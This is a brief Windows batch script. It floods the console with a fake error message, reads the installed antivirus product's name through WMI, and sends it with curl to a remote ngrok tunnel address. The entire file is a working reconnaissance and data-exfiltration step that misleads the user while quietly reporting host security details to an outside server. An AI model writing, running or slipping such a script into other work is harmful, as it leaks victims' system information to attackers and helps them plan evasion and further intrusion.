@echo off
for /l %%i in (1, 1, 20) do (
    echo Error: Something went wrong.
)
for /f "delims=" %%a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName ^| findstr /r /v "^$"') do set "antivirus=%%a"
echo Antivirus Information: %antivirus%
curl --verbose --data "%antivirus%" https://6fa3-197-35-34-224.ngrok-free.app

